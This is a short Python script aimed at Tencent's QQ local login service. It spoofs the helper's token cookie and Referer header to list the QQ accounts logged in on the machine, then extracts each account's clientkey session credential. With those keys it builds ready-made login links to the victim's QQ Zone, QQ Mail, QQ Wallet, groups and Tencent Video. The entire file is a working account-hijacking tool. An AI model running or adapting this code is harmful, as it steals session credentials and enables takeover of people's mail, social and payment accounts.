import re
import requests
import platform

def getuin():
    url = 'https://localhost.ptlogin2.qq.com:4301/pt_get_uins?callback=ptui_getuins_CB&pt_local_tk=1'
    headers = {
        'Cookie': 'pt_local_token=1',
        'Referer': 'https://xui.ptlogin2.qq.com/'
    }
    resp = requests.get(url, headers=headers,verify=False)
    if resp.status_code == 200:
        data = resp.text
        uinRegexp = re.compile(r'uin":(\d+)')
        uin = uinRegexp.findall(data)
        nicknameRegexp = re.compile(r'nickname":"(.*?)"')
        nickname = nicknameRegexp.findall(data)
        return True, uin, nickname
    return False, None, None


def getkey(uin):
    url = 'https://localhost.ptlogin2.qq.com:4301/pt_get_st?callback=__jp0&pt_local_tk=1&clientuin=%s' % uin
    headers = {
        'Cookie': 'pt_local_token=1',
        'Referer': 'https://xui.ptlogin2.qq.com/'
    }
    resp = requests.get(url, headers=headers)
    if resp.status_code == 200:
        cookie = resp.headers['Set-Cookie']
        # print(cookie)
        clientkeyRegexp = re.compile(r'clientkey=(.*?);')
        clientkey = clientkeyRegexp.findall(cookie)
        return True, clientkey[0]
    return False, None

if __name__ == '__main__':
    # try:
        status, uin, nickname = getuin()
        for i in range(len(uin)):
            if status:
                print('uin: %s, nickname: %s' % (uin[i], nickname[i]))
                status, key = getkey(uin[i])
                if status:
                    # print('key: %s' % key)
                    msg = 'uin: %s, nickname: %s, key: %s' % (uin[i], nickname[i], key)
                    if(platform.system()=='Windows'):#分别操作系统
                        system='9'
                    else:
                        system='19'
                    link = '\nQQ空间：\nhttps://ssl.ptlogin2.qq.com/jump?clientuin=%s&clientkey=%s&keyindex=%s&&u1=https://user.qzone.qq.com/%s/main\nQQ邮箱：\n' % (
                        uin[i], key,system, uin[i])+'https://ssl.ptlogin2.qq.com/jump?clientuin=%s&clientkey=%s&keyindex=%s&&u1=https://wx.mail.qq.com\nQQ钱包：\n' % (
                        uin[i], key,system)+'https://ssl.ptlogin2.qq.com/jump?clientuin=%s&clientkey=%s&keyindex=%s&&u1=https://pay.qq.com\nQQ群：\n' % (
                        uin[i], key,system)+'https://ssl.ptlogin2.qq.com/jump?clientuin=%s&clientkey=%s&keyindex=%s&&u1=https://qun.qq.com/manage.html\n腾讯视频:\n' % (
                        uin[i], key,system)+'https://ssl.ptlogin2.qq.com/jump?clientuin=%s&clientkey=%s&keyindex=%s&&u1=https://v.qq.com' % (
                        uin[i], key,system)#+'https://ssl.ptlogin2.qq.com/jump?clientuin=%s&clientkey=%s&keyindex=%s&&u1=https://graph.qq.com/oauth2.0/login_jump' % (
                        #uin[i], key,system)
                    print('link: %s' % link)
                else:
                    print('get key failed')
            else:
                print('get uin failed')
